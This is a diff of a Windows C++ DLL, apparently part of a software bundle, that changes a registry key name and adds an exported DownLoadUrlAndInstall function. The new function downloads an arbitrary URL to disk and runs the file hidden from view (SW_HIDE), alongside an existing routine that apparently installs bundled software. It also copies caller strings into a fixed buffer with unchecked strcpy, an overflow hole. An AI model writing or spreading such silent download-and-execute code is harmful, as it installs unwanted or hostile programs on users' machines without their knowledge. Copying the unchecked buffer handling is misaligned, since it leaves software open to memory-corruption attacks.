@@ -199,10 +199,10 @@ extern "C" __declspec(dllexport) void GetFileVersionString(CHAR* pszFileName, CH
 extern "C" __declspec(dllexport) void GetPeerID(CHAR * pszPeerID)
 {
 	HKEY hKEY;
-	LPCSTR data_Set= "Software\\kuaikan";
+	LPCSTR data_Set= "Software\\kuaikantu";
 	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE,data_Set,0,KEY_READ,&hKEY))
 	{
-		char szValue[256] = {0};
+		char szValue[260] = {0};
 		DWORD dwSize = sizeof(szValue);
 		DWORD dwType = REG_SZ;
 		if (::RegQueryValueExA(hKEY,"PeerId", 0, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS)
@@ -221,7 +221,7 @@ extern "C" __declspec(dllexport) void GetPeerID(CHAR * pszPeerID)
 	HKEY hKey, hTempKey;
 	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software",0,KEY_SET_VALUE, &hKey))
 	{
-		if (ERROR_SUCCESS == ::RegCreateKeyA(hKey, "kuaikan", &hTempKey))
+		if (ERROR_SUCCESS == ::RegCreateKeyA(hKey, "kuaikantu", &hTempKey))
 		{
 			::RegSetValueExA(hTempKey, "PeerId", 0, REG_SZ, (LPBYTE)pszPeerID, strlen(pszPeerID)+1);
 		}
@@ -348,6 +348,53 @@ extern "C" __declspec(dllexport) void DownLoadLvDunAndInstall()
 		if (dwRet == WAIT_FAILED)
 		{
 			TSDEBUG4CXX("wait for DownLoa dBundled Software failed, error = " << ::GetLastError());
+		}
+		CloseHandle(hThread);
+	}
+	return;
+}
+
+DWORD WINAPI ThreadDownLoadUrl(LPVOID pParameter)
+{
+	//TSAUTO();
+	const char *pUrl = (const char*)pParameter, *pName = pUrl + strlen(pUrl)+1, *pCmd = pName + strlen(pName)+1;
+	//MessageBoxA(0, pUrl, "```pUrl", 0);MessageBoxA(0, pName, "````pName", 0);MessageBoxA(0, pCmd, "```pCmd", 0);
+	::CoInitialize(NULL);
+	HRESULT hr = E_FAIL;
+	__try
+	{
+		hr = ::URLDownloadToFileA(NULL, pUrl, pName, 0, NULL);
+	}
+	__except(EXCEPTION_EXECUTE_HANDLER)
+	{
+		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
+	}
+	::CoUninitialize();
+	if (SUCCEEDED(hr) && ::PathFileExistsA(pName))
+	{
+		::ShellExecuteA(NULL,"open", pName, pCmd, NULL, SW_HIDE);
+	}
+	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
+}
+
+extern "C" __declspec(dllexport) void DownLoadUrlAndInstall(const char* szUrl, const char* szName, const char* szCmd, int Millisec = INFINITE)
+{
+	TSAUTO();
+	char szBuff[2048] = {0};
+	char *pUrl = szBuff, *pName = szBuff + strlen(szUrl)+1, *pCmd = pName + strlen(szName)+1;
+	strcpy(pUrl, szUrl);
+	strcpy(pName, szName);
+	strcpy(pCmd, szCmd);
+	//MessageBoxA(0, pUrl, "pUrl", 0);MessageBoxA(0, pName, "pName", 0);MessageBoxA(0, pCmd, "pCmd", 0);
+
+	DWORD dwThreadId = 0;
+	HANDLE hThread = CreateThread(NULL, 0, ThreadDownLoadUrl, (LPVOID)szBuff,0, &dwThreadId);
+	if (NULL != hThread)
+	{
+		DWORD dwRet = WaitForSingleObject(hThread, Millisec);
+		if (dwRet == WAIT_FAILED)
+		{
+			TSDEBUG4CXX("wait for DownLoadd Software failed, error = " << ::GetLastError());
 		}
 		CloseHandle(hThread);
 	}
